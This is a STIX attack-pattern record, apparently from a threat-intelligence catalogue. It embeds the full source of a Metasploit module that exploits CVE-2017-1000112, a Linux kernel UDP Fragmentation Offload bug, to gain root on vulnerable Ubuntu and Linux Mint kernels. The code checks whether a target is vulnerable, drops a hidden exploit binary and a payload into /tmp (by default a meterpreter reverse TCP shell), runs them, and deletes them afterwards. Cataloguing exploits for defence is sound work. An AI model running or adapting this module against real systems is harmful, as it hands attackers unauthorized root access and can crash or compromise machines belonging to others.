{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ceca7537-e3bc-47e7-b5cf-4a6ecfa29493",
    "created": "2024-08-14T16:59:12.083385Z",
    "modified": "2024-08-14T16:59:12.083389Z",
    "name": "Linux Kernel UDP Fragmentation Offset (UFO) Privilege Escalation",
    "description": " This module attempts to gain root privileges on Linux systems by abusing UDP Fragmentation Offload (UFO).  This exploit targets only systems using Ubuntu (Trusty / Xenial) kernels 4.4.0-21 <= 4.4.0-89 and 4.8.0-34 <= 4.8.0-58, including Linux distros based on Ubuntu, such as Linux Mint.  The target system must have unprivileged user namespaces enabled and SMAP disabled.  Bypasses for SMEP and KASLR are included. Failed exploitation may crash the kernel.  This module has been tested successfully on various Ubuntu and Linux Mint systems, including:  Ubuntu 14.04.5 4.4.0-31-generic x64 Desktop; Ubuntu 16.04 4.8.0-53-generic; Linux Mint 17.3 4.4.0-89-generic; Linux Mint 18 4.8.0-58-generic  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/ufo_privilege_escalation.rb",
            "external_id": "ufo_privilege_escalation.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-1000112"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2017/q3/277"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c"
        },
        {
            "source_name": "reference",
            "url": "https://git.kernel.org/pub/scm/linux/kernel/git/davem/net.git/commit/?id=85f1bd9a7b5a79d5baa8bf44af19658f7bf77bfa"
        },
        {
            "source_name": "reference",
            "url": "https://people.canonical.com/~ubuntu-security/cve/CVE-2017-1000112"
        },
        {
            "source_name": "reference",
            "url": "https://securingtomorrow.mcafee.com/mcafee-labs/linux-kernel-vulnerability-can-lead-to-privilege-escalation-analyzing-cve-2017-1000112/"
        },
        {
            "source_name": "reference",
            "url": "https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bcoles/kernel-exploits/commits/cve-2017-1000112"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Linux Kernel UDP Fragmentation Offset (UFO) Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on Linux systems by abusing\n        UDP Fragmentation Offload (UFO).\n\n        This exploit targets only systems using Ubuntu (Trusty / Xenial) kernels\n        4.4.0-21 <= 4.4.0-89 and 4.8.0-34 <= 4.8.0-58, including Linux distros\n        based on Ubuntu, such as Linux Mint.\n\n        The target system must have unprivileged user namespaces enabled\n        and SMAP disabled.\n\n        Bypasses for SMEP and KASLR are included. Failed exploitation\n        may crash the kernel.\n\n        This module has been tested successfully on various Ubuntu and Linux\n        Mint systems, including:\n\n        Ubuntu 14.04.5 4.4.0-31-generic x64 Desktop;\n        Ubuntu 16.04 4.8.0-53-generic;\n        Linux Mint 17.3 4.4.0-89-generic;\n        Linux Mint 18 4.8.0-58-generic\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Andrey Konovalov', # Discovery and C exploit\n          'h00die',           # Metasploit module\n          'bcoles'     # Metasploit module\n        ],\n      'DisclosureDate' => '2017-08-10',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'CVE', '2017-1000112' ],\n          [ 'EDB', '43418' ],\n          [ 'BID', '100262' ],\n          [ 'URL', 'https://seclists.org/oss-sec/2017/q3/277' ],\n          [ 'URL', 'https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c' ],\n          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/davem/net.git/commit/?id=85f1bd9a7b5a79d5baa8bf44af19658f7bf77bfa' ],\n          [ 'URL', 'https://people.canonical.com/~ubuntu-security/cve/CVE-2017-1000112' ],\n          [ 'URL', 'https://securingtomorrow.mcafee.com/mcafee-labs/linux-kernel-vulnerability-can-lead-to-privilege-escalation-analyzing-cve-2017-1000112/' ],\n          [ 'URL', 'https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html' ],\n          [ 'URL', 'https://github.com/bcoles/kernel-exploits/commits/cve-2017-1000112' ]\n        ],\n      'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },\n      'Notes'          =>\n        {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_OS_DOWN ],\n        },\n      'DefaultTarget'  => 0))\n    register_options [\n      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w[Auto True False] ])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    cmd_exec \"chmod +x '#{path}'\"\n  end\n\n  def upload_and_compile(path, data)\n    upload \"#{path}.c\", data\n\n    gcc_cmd = \"gcc -o #{path} #{path}.c\"\n    if session.type.eql? 'shell'\n      gcc_cmd = \"PATH=$PATH:/usr/bin/ #{gcc_cmd}\"\n    end\n    output = cmd_exec gcc_cmd\n    rm_f \"#{path}.c\"\n\n    unless output.blank?\n      print_error output\n      fail_with Failure::Unknown, \"#{path}.c failed to compile\"\n    end\n\n    cmd_exec \"chmod +x #{path}\"\n  end\n\n  def strip_comments(c_code)\n    c_code.gsub(%r{/\\*.*?\\*/}m, '').gsub(%r{^\\s*//.*$}, '')\n  end\n\n  def exploit_data(file)\n    ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2017-1000112', file)\n  end\n\n  def live_compile?\n    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')\n\n    if has_gcc?\n      vprint_good 'gcc is installed'\n      return true\n    end\n\n    unless datastore['COMPILE'].eql? 'Auto'\n      fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'\n    end\n  end\n\n  def check\n    arch = kernel_hardware\n    unless arch.include? 'x86_64'\n      vprint_error \"System architecture #{arch} is not supported\"\n      return CheckCode::Safe\n    end\n    vprint_good \"System architecture #{arch} is supported\"\n\n    version = kernel_release\n    unless version =~ /^4\\.4\\.0-(21|22|24|28|31|34|36|38|42|45|47|51|53|57|59|62|63|64|66|67|70|71|72|75|78|79|81|83|87|89|81|89)-generic/ ||\n           version =~ /^4\\.8\\.0-(34|36|39|41|45|46|49|51|52|53|54|56|58)-generic/\n      vprint_error \"Linux kernel version #{version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Linux kernel version #{version} is vulnerable\"\n\n    vprint_status 'Checking if SMAP is enabled ...'\n    if smap_enabled?\n      vprint_error 'SMAP is enabled'\n      return CheckCode::Safe\n    end\n    vprint_good 'SMAP is not enabled'\n\n    config = kernel_config\n    if config.nil?\n      vprint_error 'Could not retrieve kernel config'\n      return CheckCode::Unknown\n    end\n\n    unless config.include? 'CONFIG_USER_NS=y'\n      vprint_error 'Kernel config does not include CONFIG_USER_NS'\n      return CheckCode::Safe\n    end\n    vprint_good 'Kernel config has CONFIG_USER_NS enabled'\n\n    unless userns_enabled?\n      vprint_error 'Unprivileged user namespaces are not permitted'\n      return CheckCode::Safe\n    end\n    vprint_good 'Unprivileged user namespaces are permitted'\n\n    if lkrg_installed?\n      vprint_error 'LKRG is installed'\n      return CheckCode::Safe\n    end\n    vprint_good 'LKRG is not installed'\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # Upload exploit executable\n    executable_name = \".#{rand_text_alphanumeric rand(5..10)}\"\n    executable_path = \"#{base_dir}/#{executable_name}\"\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n      upload_and_compile executable_path, strip_comments(exploit_data('exploit.c'))\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      upload_and_chmodx executable_path, exploit_data('exploit.out')\n    end\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    # Launch exploit\n    print_status 'Launching exploit ...'\n    output = cmd_exec \"echo '#{payload_path} & exit' | #{executable_path}\"\n    output.each_line { |line| vprint_status line.chomp }\n    print_status \"Cleaning up #{payload_path} and #{executable_path} ...\"\n    rm_f executable_path\n    rm_f payload_path\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-08-10",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}